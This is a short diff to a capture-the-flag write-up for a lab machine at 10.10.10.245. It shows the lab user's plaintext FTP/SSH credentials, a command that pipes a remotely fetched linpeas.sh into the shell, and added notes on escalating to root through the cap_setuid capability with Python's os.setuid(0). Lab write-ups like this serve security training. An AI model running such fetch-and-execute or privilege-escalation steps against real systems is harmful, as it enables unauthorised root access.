@@ -140,7 +140,7 @@ http://10.10.10.245/data/0
 
 ![image](https://github.com/user-attachments/assets/54407fd9-171b-410c-93ba-183c870c7876)
 
-Credentials
+Credentials for FTP and SSH.
 
 `nathan`:`Buck3tH4TF0RM3!`
 
@@ -176,6 +176,14 @@ Or get it localy and run it.
     curl -l http://your-address/linpeas.sh | sh
 
 ![image](https://github.com/user-attachments/assets/7f6cffe7-c8c8-4f44-b84a-e6701aa460f9)
+
+Now we can see `cap_setuid` capabiliries, it allows to make arbitrary manipulations with UID process.
+
+It means that `cap_setuid` allows to changing of the UID (user ID).
+
+We can set the UID to 0. That means we can run our command as a root.
+
+So, run the folowing commands in server's python to get a root permission.
 
     import os
     os.setuid(0)
